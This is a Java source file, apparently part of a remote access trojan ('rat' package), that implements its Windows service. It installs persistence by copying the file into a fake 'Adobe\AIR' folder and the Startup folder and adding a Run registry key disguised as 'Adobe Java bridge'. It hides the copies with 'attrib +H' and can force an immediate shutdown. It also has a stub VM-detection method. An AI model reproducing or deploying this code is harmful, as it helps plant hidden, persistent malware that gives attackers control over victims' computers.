package de.sogomn.rat.service;

import java.io.File;

import de.sogomn.engine.util.FileUtils;

public final class WindowsService implements IOperatingSystemService {
	
	private static final String SHUTDOWN_COMMAND = "shutdown -s -t 0";
	private static final String STARTUP_DIRECTORY_PATH = System.getenv("APPDATA") + File.separator + "Adobe" + File.separator + "AIR";
	private static final String STARTUP_DIRECTORY_PATH_2 = System.getenv("APPDATA") + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "Start Menu" + File.separator + "Programs" + File.separator + "Startup";
	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD \"HKCU" + File.separator + "SOFTWARE" + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "CurrentVersion" + File.separator + "Run\" /v \"Adobe Java bridge\" /d \"%s\"";
	private static final String HIDE_FILE_COMMAND = "attrib +H %s";
	
	WindowsService() {
		//...
	}
	
	@Override
	public void shutDown() {
		try {
			Runtime.getRuntime().exec(SHUTDOWN_COMMAND);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	@Override
	public void addToStartup(final File file) {
		try {
			final String name = file.getName();
			final String path = STARTUP_DIRECTORY_PATH + File.separator + name;
			final String path2 = STARTUP_DIRECTORY_PATH_2 + File.separator + name;
			final File destination = new File(path);
			final File destination2 = new File(path2);
			final String registryCommand = String.format(STARTUP_REGISTRY_COMMAND, path);
			final String hideFileCommand = String.format(HIDE_FILE_COMMAND, path);
			final String hideFileCommand2 = String.format(HIDE_FILE_COMMAND, path2);
			
			FileUtils.createFile(path);
			FileUtils.copyFile(file, destination);
			FileUtils.copyFile(file, destination2);
			
			Runtime.getRuntime().exec(registryCommand);
			Runtime.getRuntime().exec(hideFileCommand);
			Runtime.getRuntime().exec(hideFileCommand2);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	@Override
	public void removeFromStartup(final File file) {
		//...
	}
	
	public boolean isVm() {
		return false;
	}
	
}
